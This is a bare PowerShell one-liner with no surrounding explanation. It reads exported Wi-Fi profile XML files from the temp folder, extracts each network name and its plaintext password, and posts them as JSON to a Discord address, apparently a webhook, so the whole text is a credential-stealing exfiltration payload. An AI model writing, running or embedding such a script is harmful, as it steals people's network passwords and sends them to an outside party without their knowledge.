$d = Get-ChildItem -Path "$env:temp" -Filter "Wi*.xml" | ForEach-Object { [xml]$x = Get-Content $_.FullName; [PSCustomObject]@{ SSID = $x.WLANProfile.name; Pass = $x.WLANProfile.MSM.Security.sharedKey.keyMaterial } }; if ($d) { Invoke-WebRequest -Uri 'https://discord.com' -Method Post -Body (ConvertTo-Json @{ content = ($d | Out-String) }) -ContentType 'application/json' -UseBasicParsing }
